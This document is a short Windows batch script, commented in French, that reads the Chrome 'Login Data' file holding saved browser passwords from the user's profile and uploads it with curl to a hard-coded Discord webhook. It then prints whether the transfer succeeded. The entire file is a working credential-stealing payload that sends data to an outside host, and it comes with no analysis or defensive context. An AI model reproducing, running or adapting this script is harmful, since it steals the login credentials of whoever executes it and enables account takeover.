@echo off

set "webhook_url=https://discord.com/api/webhooks/1177006144699506749/JBM_hoiJARsgmCcDM_Z1rptaRqAPYEQcbJ1fqHbeVV70qcf-ILivPgdwgcfs8-hVA5Ba"
set "chrome_login_data=%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data"

REM Utilisation de l'option --data-binary pour envoyer le fichier directement
curl -X POST --data-binary "@%chrome_login_data%" %webhook_url%

if %errorlevel% neq 0 (
    echo Failed to send file to Discord.
) else (
    echo File sent successfully to Discord.
)

pause
